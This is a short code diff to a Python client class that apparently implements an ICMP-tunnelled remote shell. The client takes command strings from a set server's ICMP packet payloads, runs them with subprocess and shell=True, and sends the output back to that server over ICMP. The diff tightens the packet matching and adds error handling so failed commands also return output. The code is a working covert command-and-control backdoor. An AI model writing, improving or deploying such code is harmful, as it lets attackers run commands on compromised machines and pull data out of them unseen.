@@ -58,10 +58,13 @@ class Client:
         -echo-request (code 8)
         """
 
-        if packet[IP].src == self.server and packet[ICMP].type == 8 and packet[ICMP].id == self.ID and packet[Raw].load:
+        if packet[IP].src == self.server and packet[ICMP].type == 0 and packet[ICMP].id == self.ID and packet[Raw].load:
             opt_data = (packet[Raw].load).decode('utf-8', errors='ignore')
-            data = subprocess.check_output(opt_data, stderr=subprocess.STDOUT, shell=True)
-            sr1((IP(dst=self.server, ttl=self.TTL)/ICMP(type=0,id=self.ID)/data), verbose=0)
+            try:
+                data = subprocess.check_output(opt_data, stderr=subprocess.STDOUT, shell=True)
+            except subprocess.CalledProcessError as error:
+                data = error.output
+            send(IP(dst=self.server, ttl=self.TTL) / ICMP(type=0,id=self.ID) / data)
 
 
 if __name__ == "__main__":
